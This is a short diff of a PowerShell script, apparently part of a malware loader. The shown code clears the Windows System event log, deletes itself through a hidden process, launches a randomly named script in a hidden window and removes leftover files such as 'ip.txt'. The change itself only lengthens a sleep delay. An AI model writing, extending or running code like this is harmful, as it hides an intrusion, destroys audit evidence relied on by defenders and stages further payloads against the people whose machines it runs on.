@@ -183,8 +183,9 @@ wevtutil cl "System" 2>$null
 if (-not $PSCommandPath.Contains("ProgramData")) {
     Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
 }
+
 Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
-Start-Sleep -Seconds 200
+Start-Sleep -Seconds 360
 
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
